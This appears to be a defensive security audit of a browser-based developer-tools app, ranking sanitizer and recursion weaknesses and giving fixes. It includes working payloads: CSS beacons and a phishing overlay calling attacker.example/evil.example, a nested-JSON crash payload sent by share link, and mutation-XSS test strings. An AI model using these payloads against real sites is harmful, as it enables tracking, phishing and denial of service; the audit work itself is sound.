# Security audit: dev-dock

Scope: client-side exploitability of the static SPA at time of audit. DOMPurify
3.4.15, marked 16.4.2 (as installed; package.json floors are lower). All
findings below were reproduced against the actual code, either by reading the
execution path end to end or by running the real sanitizer/algorithm with the
project's own installed dependencies. `npx vitest run` is green (720/720)
before and after this audit, nothing here is a regression. These are gaps
the existing suite doesn't cover.

Ranked by exploitability. "Exploitable now" = a concrete input triggers real
impact today. "Defence in depth" = would only matter if an upstream
assumption breaks. "Checked, not a problem" = investigated per the audit
brief and found sound.

---

## Exploitable now

### 1. Inline `style` attribute survives sanitization, CSS-based network beacon and full-page overlay, defeats the "nothing leaves your browser" claim

**File:** `src/tools/markdown/markdown.ts:110-117` (`SANITIZE_CONFIG`)

DOMPurify's default attribute allowlist includes the `style` attribute, and
`SANITIZE_CONFIG` never restricts it (`ALLOWED_ATTR` is unset, `FORBID_TAGS`
only removes tags, not attributes). DOMPurify does not parse or filter CSS
_values_ inside `style="..."`, verified directly against the installed
`dompurify@3.4.15` with this file's exact hook and config:

```
IN : <div style="background:url(https://evil.example/beacon.png)">tracked</div>
OUT: <div style="background:url(https://evil.example/beacon.png)">tracked</div>
```

**Exploit:** paste (or receive as someone else's README) markdown containing
raw HTML like:

```html
<div style="background:url(https://attacker.example/pixel.png?id=victim)"></div>
```

The instant the Markdown tool previews it, the browser fetches that URL,
an outbound request the user never composed, fired by content they only
_viewed_. SECURITY.md's threat model item 3 is explicitly "the user's trust
in the 'nothing leaves your browser' claim," and item 4 in the design
decisions ("Nothing is transmitted... **The one exception** is the HTTP
Request Builder") is a direct, falsifiable claim that this breaks. The CSP in
`deploy/_headers` / `deploy/vercel.json` / `deploy/nginx*.conf` does not
mitigate it: `style-src 'self' 'unsafe-inline'` is required for the app's own
styling and permits inline `style="..."` attribute values, so CSP provides no
backstop here.

The same `style` attribute also lets a malicious document take over the
visible tab with a full-viewport overlay, independent of the DOM nesting of
the sanitized `<div>`:

```
IN : <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:99999">OVERLAY: enter your API key at evil.example</div>
OUT: <div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:99999">OVERLAY: enter your API key at evil.example</div>
```

There's no script execution possible here (DOMPurify still strips
`on*`/`script`/etc.), so this can't steal keystrokes directly, but it can
fully obscure the real UI with fake instructions, phishing text, or a fake
"link" (an `<a>` is still allowed and gets `target=_blank rel=noopener
noreferrer`, so a full-bleed clickable overlay pointing at an attacker URL is
straightforward).

**Fix:** add `style` to `FORBID_ATTR` in `SANITIZE_CONFIG` (a markdown
preview has no legitimate need for arbitrary inline CSS, GFM doesn't
generate `style=`, only raw embedded HTML does, which is exactly the hostile
path this file's own docstring warns about). If inline color/highlighting
styles are ever wanted, allowlist a narrow, deny-by-default property set
instead of allowing the raw attribute value through.

---

### 2. Unbounded recursion on nested JSON crashes the JSON Formatter and JSON Tree tools, including from a share link, matching SECURITY.md's own attacker model

**Files:**

- `src/tools/json-formatter/json.ts:141-158` (`measure`, called unconditionally by every `processJson` call, including `validate` mode)
- `src/tools/json-formatter/json.ts:108-118` (`sortKeysDeep`, when "sort keys" is on)
- `src/tools/json-tree/tree.ts:104-127` (`resolve`), `:140-153` (`containerPaths`), `:181-221` (`searchTree`'s `visit`)

All five are plain recursive functions with no depth limit. `JSON.parse`
itself has no practical depth ceiling in V8 (tested to 200,000 levels of
nesting without error), but a same-shaped naive recursive walk over the
_parsed_ value stack-overflows at approximately 5,000 levels on Node's
default stack, the browser main thread's stack is typically smaller still:

```
$ node -e '
function walk(node, depth) {
  if (Array.isArray(node)) for (const item of node) walk(item, depth+1)
}
const s = "[".repeat(10000) + "1" + "]".repeat(10000)  // 20,001 bytes
walk(JSON.parse(s), 1)
'
RangeError: Maximum call stack size exceeded
```

**Exploit:** paste `"[".repeat(10000) + "1" + "]".repeat(10000)`, a 20 KB,
entirely well-formed JSON document, into the JSON Formatter or the JSON
Tree tool. `processJson`/`containerPaths` runs inside a `useMemo` fired on
every keystroke (`JsonFormatterTool.tsx:66-73`, no button gate), so the tool
crashes to its `ToolErrorBoundary` fallback the moment the paste lands.

This is worse than a self-inflicted paste, though: `state.input` in
`JsonFormatterTool` and the JSON value in `JsonTreeTool` both hydrate from
`useShareState`, which decodes directly from the URL fragment (`#s=...`)
_before_ the tool renders (`src/tools/useShareState.ts:36-38`). SECURITY.md's
own threat model names "whoever sends the user a link" as an attacker.
Someone can build a Dev Dock share link carrying this payload and hand it to
a colleague; the tool crashes on open, no interaction required beyond
clicking the link.

This contradicts two explicit SECURITY.md claims:

- "No tool is permitted to throw into the render path" (the error boundary
  catches it, so the _app_ survives, but the _tool_ still throws, the
  claim as written implies parsers are defensive enough that this shouldn't
  happen at all, and the "Bounded work" table lists a "Rendered-node cap"
  for JSON tree but nothing for parse/measure depth, which is what actually
  breaks first).
- "Silent truncation is treated as a bug", here it's not silent truncation,
  it's an unannounced crash with no cap message, which is arguably worse.

**Fix:** cap recursion depth in `measure`, `sortKeysDeep`, `resolve`,
`containerPaths`, and `searchTree`'s `visit` (e.g., stop descending past
~500-1000 levels and report "nesting too deep to fully analyze" the same way
the diff tools report their edit-distance ceiling), or convert the walks to
an explicit stack instead of the call stack so depth is bounded by heap, not
frames.

---

## Defence in depth (real gaps, no working exploit found today)

### 3. `renderMarkdown`'s DOMPurify call uses the library's default tag profile (HTML + SVG + MathML), which is broader than a markdown preview needs

**File:** `src/tools/markdown/markdown.ts:110-117`

`SANITIZE_CONFIG` sets neither `ALLOWED_TAGS` nor `USE_PROFILES`, so DOMPurify
sanitizes against its full default allowlist, which includes SVG and MathML
elements (`<svg>`, `<math>`, `<foreignObject>`, `<maction>`, `<mglyph>`,
etc.), the exact namespace-confusion surface that produced several
historical DOMPurify mutation-XSS CVEs (`<svg><p><style>...`,
`<math><mtext><table><mglyph>...`). I tried the classic bypass shapes against
the installed 3.4.15 with this file's real config and none got through,
the library is current and those specific bugs are patched:

```
<svg><p><style><img src=x onerror=alert(1)></style></p></svg>            -> <svg></svg><p></p>
<math><mtext><table><mglyph><style><img ...></style></table></mtext>...  -> <math><mtext><table></table></mtext></math>
<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">-> <math>CLICKME</math>
```

So this is not exploitable _today_. It's flagged because the attack surface
is unnecessary: a Markdown → HTML preview has no legitimate use for SVG or
MathML content, and every future mXSS bug discovered in DOMPurify's
SVG/MathML handling (a real, recurring bug class) becomes exploitable here
the day it's found, with zero code change on this side. `<template>`
handling and `id`/`name`-based DOM clobbering were also tried and are
correctly neutralized by DOMPurify's built-in `SANITIZE_DOM` (on by
default), no action needed there.

**Fix:** pass `USE_PROFILES: { html: true }` (or an explicit `ALLOWED_TAGS`
list of the markdown-relevant elements) to `DOMPurify.sanitize`, dropping
SVG/MathML entirely. Add a regression test asserting `<svg>`/`<math>` never
survive, so this can't silently regress if someone "helpfully" adds a
profile flag later.

### 4. GitHub Actions in `.github/workflows/*.yml` are pinned to tags, not commit SHAs

**Files:** `.github/workflows/ci.yml`, `pages.yml`, `security.yml`

Every `uses:` line (`actions/checkout@v5`, `pnpm/action-setup@v4`,
`github/codeql-action/*@v3`, etc.) pins a mutable tag. None of the workflows
interpolate untrusted input into a `run:` shell step (no
`${{ github.event.*.body }}`-style injection, no `pull_request_target`), and
`permissions:` is minimal (`contents: read` by default, with `pages: write` /
`id-token: write` scoped to the one job that needs them), so there's no live
injection vector. The tag-pinning is a standard supply-chain hardening gap:
if any of these actions' repos or tags is compromised upstream, CI trusts
whatever that tag now points to. Not urgent for a repo with no secrets in
scope beyond `GITHUB_TOKEN`, but cheap to close.

**Fix:** pin to commit SHA with the version as a trailing comment (Dependabot
already updates SHA-pinned actions), e.g. `actions/checkout@<sha> # v5.x.x`.

---

## Checked, not a problem

- **`href`/`src` scheme allowlist (`isDangerousUrl`,
  `src/tools/markdown/markdown.ts:69-79`).** Tried control-character
  smuggling (`java\tscript:`), percent-encoding (`%6a%61vascript:`),
  mixed case, and combinations of both against the real function, all
  correctly stripped. The decode-then-recheck approach is sound because it
  checks both the raw and decoded form rather than trusting one.
- **`data:image/svg+xml` is correctly excluded**, `ALLOWED_DATA_IMAGE_RE`
  only matches `png|jpeg|gif|webp`, verified by both the existing test suite
  and manual re-check. The file's own reasoning for excluding it (SVG can
  carry `<script>`/event handlers; image-context script suppression is a
  rendering-context nicety, not a property of the bytes) is correct and this
  is the right call, allowing it would be a real regression, not a
  hardening opportunity.
- **Error path for `renderMarkdown`.** If `marked.parse` or
  `DOMPurify.sanitize` ever throws, the throw happens inside a `useMemo`
  (`MarkdownTool.tsx:100-103`) before `html` is assigned, so
  `dangerouslySetInnerHTML` never receives a value at all, the component
  unmounts to `ToolErrorBoundary` instead of rendering anything unsanitized.
  There is no code path where unsanitized HTML reaches the DOM.
- **HTTP Request Builder never fires without a click.** `send()` in
  `HttpClientTool.tsx` only runs from the Send button's `onClick`. The
  Sample button only patches `method`/`url` state, it doesn't call `send()`.
  `useShareState` for this tool only decodes `method`/`url`
  (`HttpClientTool.tsx:47-58`) into the same inert state, no request fires
  from a share link either.
- **Credentials and headers correctly excluded from share state.**
  `headers`, `bodyMode`, `rawBody`, `sendCredentials` are all plain
  `useState`, never passed through `useShareState`, confirmed by reading
  every state declaration in `HttpClientTool.tsx:76-96`. `sendCredentials`
  defaults to `false` and is the literal boolean passed to `fetch`'s
  `credentials: input.sendCredentials ? 'include' : 'omit'`
  (`http.ts:230`), cookies are never sent unless the checkbox is on.
- **Response body is never rendered as HTML or eval'd.** It's placed in a
  read-only `CodeArea` (`HttpClientTool.tsx:427-434`), a plain `<textarea>`,
  never `dangerouslySetInnerHTML`, never parsed as script.
- **`toCurl` shell-quoting (`http.ts:163-179`).** Tried a body containing
  `'`, `$(whoami)`, `` `id` ``, and embedded newlines, the `'\''`
  close-escape-reopen scheme is correct for arbitrary bytes inside single
  quotes in POSIX shells; none of those characters are special inside
  single quotes, so nothing escapes the quoting.
- **URL schemes in the HTTP Request Builder.** `javascript:` isn't
  fetchable (`fetch()` throws `TypeError: Failed to fetch` on it
  immediately, before any network activity). `file:` is blocked by the
  browser's own `fetch()` implementation regardless of app code. `data:`
  and `blob:` are fetchable but only ever operate on the user's own typed
  input in their own tab, not a cross-user or cross-origin exploit path.
  `explainFetchFailure` correctly identifies non-http(s) schemes after the
  fact for user-facing messaging.
- **Share links use the URL fragment, never the query string.**
  `src/lib/share.ts` builds every link as `#s=<payload>`
  (`buildShareUrl:139-142`) and reads only from `window.location.hash`
  (`readShareFragment:145-148`). No query-string path exists anywhere in the
  share code.
- **`useShareState`'s merge (`{ ...defaults, ...inbound }`,
  `useShareState.ts:38-39`) is not exploitable for prototype pollution.**
  `inbound` comes from `JSON.parse` (inside `decodeShareState`), and a
  `"__proto__"` key produced by `JSON.parse` is an ordinary own data
  property, not the accessor, object spread's `CopyDataProperties`
  likewise defines it as a plain own property on the result. Neither step
  reaches `Object.prototype`. `shapeValidator` also only validates declared
  keys (extra keys, including a literal `"__proto__"` key, pass through
  untouched as inert data on the resulting object), confirmed no tool reads
  or `Object.assign`s state into anything that would resolve it as a real
  prototype.
- **`localStorage` usage matches the claim.** `src/lib/storage.ts` is the
  only file touching `localStorage` directly (grepped the whole `src` tree).
  Its only callers are `src/app/preferences.tsx` (theme, pinned tool ids,
  recent tool ids, all filtered against `TOOL_BY_ID` on read) and
  `src/components/SplitPane.tsx` (pane split ratios). No tool persists its
  own input anywhere.
- **Console logging.** Only one `console.*` call in the whole `src` tree
  (`ToolErrorBoundary.tsx:37`), logging the `Error` object and React's
  component stack, not raw tool input. No `throw new Error(\`...${userInput}...\`)` pattern exists anywhere that would smuggle pasted
  secrets into a logged error message.
- **Regex DoS.** The worker path (`regexRunner.ts`) correctly times out and
  terminates; `executeRegex` (`regexTypes.ts`) guards the classic
  zero-length-match infinite loop and caps match count before the timeout
  would even fire. No `new RegExp` on user input exists outside this path
  or the worker/fallback pair (grepped every call site).
- **Diff tools honor their stated edit-distance ceiling.**
  `src/lib/diff.ts:45` (`DEFAULT_MAX_D = 3000`) is a real, enforced cap
  applied before the O(nd) algorithm runs, with a UI message
  (`TextDiffTool.tsx:188`, `CodeDiffTool.tsx:299`) when it's hit.
- **Cron next-run search is bounded by wall-clock time, not iteration
  count**, exactly as documented (`cron.ts:384-389`, five-year horizon).
- **Punycode decoder** (`urlparts.ts`) is bounded by input length on every
  loop (each iteration consumes at least one character or throws), and is
  fully wrapped in try/catch per label.
- **File-size caps exist and are user-visible** for the two tools that
  actually process binary files: Base64 (`MAX_FILE_BYTES = 8 MiB`,
  `Base64Tool.tsx:42`) and Hash Generator (`64 MiB`,
  `HashGeneratorTool.tsx:45`), both show a toast naming the limit when hit.
  `CodeArea`'s generic drop handler (used by Markdown, JSON Formatter, JSON
  Tree, Text/Code Diff, Text Stats, SQL Formatter) also caps at 5 MiB
  (`DEFAULT_MAX_DROP`, `CodeArea.tsx:33`), see finding below for the one
  gap in this otherwise-sound picture.
- **HTML Entities decoder never touches `innerHTML`**, walks the string
  with an explicit grammar (`entities.ts`), exactly as SECURITY.md claims.
- **ESLint enforces the stated bans**, `no-eval`, `no-implied-eval`,
  `no-new-func`, and a `no-restricted-properties` rule specifically naming
  `document.write` all exist in `eslint.config.js:41-49`. No `eval`/`new
Function` call exists anywhere in `src` (grepped).
- **Dependency surface is small and current.** 8 runtime dependencies as
  claimed; `dompurify` (3.4.15) and `marked` (16.4.2) as installed are both
  ahead of the package.json floor and current, not stale-and-vulnerable.
  `pnpm audit --prod --audit-level high` gates CI (`security.yml`); CodeQL
  runs on push/PR/weekly schedule.

---

## Minor / low-severity (worth a one-line fix, not a security bug)

### 5. `CodeArea`'s generic file-drop rejection is silent

**File:** `src/components/CodeArea.tsx:127-131`

```ts
const file = event.dataTransfer.files[0]
if (!file) return
if (file.size > maxDropBytes) return // <- no feedback
onValueChange?.(await file.text())
```

Every other cap in the app (Base64, Hash Generator, the diff edit-distance
ceiling, the JSON tree node cap, test-data row cap) shows a message when it
bites, matching SECURITY.md's explicit "Silent truncation is treated as a
bug." This one path doesn't: drop an oversized file onto the Markdown, JSON
Formatter, JSON Tree, Text/Code Diff, Text Stats, or SQL Formatter editor and
nothing happens, no error, no toast, the drop just silently does nothing.
Not a security hole (no data is lost or exposed; the file is simply never
read), but it's the one place in the app that violates the project's own
explicitly-stated bar.

**Fix:** thread a `toast.show(...)` (or an `onRejected` callback) through
`CodeArea` the same way `Base64Tool`/`HashGeneratorTool` already do for their
own drop zones.

### 6. Markdown image `src` (and now `style`, see finding #1) can make outbound requests on mere preview, and this isn't mentioned in SECURITY.md at all

**File:** `src/tools/markdown/markdown.ts` (inherent to allowing `<img
src="https://...">`, which is required for normal Markdown image support and
is not itself a bug)

Pasting `![x](https://attacker.example/pixel.png)`, completely ordinary
Markdown syntax, not a bypass of anything, causes the browser to fetch that
URL the moment the preview renders, leaking the visitor's IP, user agent, and
(depending on deployment's `Referrer-Policy`, which the shipped configs
correctly set to `no-referrer`) at minimum confirms the page was viewed. This
is standard behavior for essentially every Markdown renderer (GitHub proxies
images through Camo specifically to avoid this) and isn't something to
"fix" in this app, a markdown previewer that can't show images isn't
useful. It's listed here because SECURITY.md's "Nothing is transmitted"
section carves out exactly one exception (the HTTP Request Builder) and this
is a second, real one that a security-conscious reader would want named
rather than discovered.

**Fix:** not a code change, add one sentence to SECURITY.md's "Nothing is
transmitted" section noting that rendered Markdown images (and, once fixed,
nothing else) can cause outbound requests, the same way the HTTP Request
Builder exception is called out.

---

## Summary for triage

| #   | Finding                                                                     | Class                   | Fix effort                        |
| --- | --------------------------------------------------------------------------- | ----------------------- | --------------------------------- |
| 1   | `style` attribute survives DOMPurify, CSS beacon + full-page overlay        | Exploitable now         | 1 line (`FORBID_ATTR: ['style']`) |
| 2   | Unbounded recursion on nested JSON crashes JSON tools, incl. via share link | Exploitable now         | Small (depth cap in 5 functions)  |
| 3   | DOMPurify default profile includes unneeded SVG/MathML surface              | Defence in depth        | 1 line (`USE_PROFILES`)           |
| 4   | Actions pinned to tags, not SHAs                                            | Defence in depth        | Mechanical                        |
| 5   | Silent drop-rejection in generic `CodeArea`                                 | Minor / claim violation | Small                             |
| 6   | Markdown images make outbound requests, undocumented                        | Minor / doc gap         | Docs only                         |

Everything under "Checked, not a problem" was specifically tried against the
real code and real dependencies, not assumed safe from reading intent,
where SECURITY.md makes a claim, it held except for the two exploitable-now
items above.
